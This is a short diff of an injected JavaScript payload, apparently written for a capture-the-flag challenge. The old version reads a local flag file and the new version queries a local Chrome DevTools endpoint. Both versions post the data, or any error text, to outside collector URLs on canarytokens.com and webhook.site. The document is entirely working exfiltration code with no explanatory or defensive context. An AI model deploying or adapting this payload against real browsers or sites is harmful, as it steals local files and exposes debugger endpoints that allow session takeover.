@@ -1,15 +1,15 @@
 <script>
-  fetch('https://canarytokens.com/traffic/images/feedback/b0isgmcjy5fuvogxw8ulf0nti/payments.js');
-fetch('file:///app/flag.txt')
+  fetch('https://webhook.site/e250c3ac-e148-4111-ae94-a1b54b9ca8ab');
+fetch('http://localhost:9223/json/list')
   .then(response => response.text())
   .then(data => {
-    fetch('https://canarytokens.com/traffic/images/feedback/b0isgmcjy5fuvogxw8ulf0nti/payments.js', {
+    fetch('https://webhook.site/e250c3ac-e148-4111-ae94-a1b54b9ca8ab', {
       method: 'POST',
       body: 'flag=' + encodeURIComponent(data)
     });
   })
   .catch(error => {
-    fetch('https://canarytokens.com/traffic/images/feedback/b0isgmcjy5fuvogxw8ulf0nti/payments.js', {
+    fetch('https://webhook.site/e250c3ac-e148-4111-ae94-a1b54b9ca8ab', {
       method: 'POST',
       body: 'error=' + encodeURIComponent(error.toString())
     });
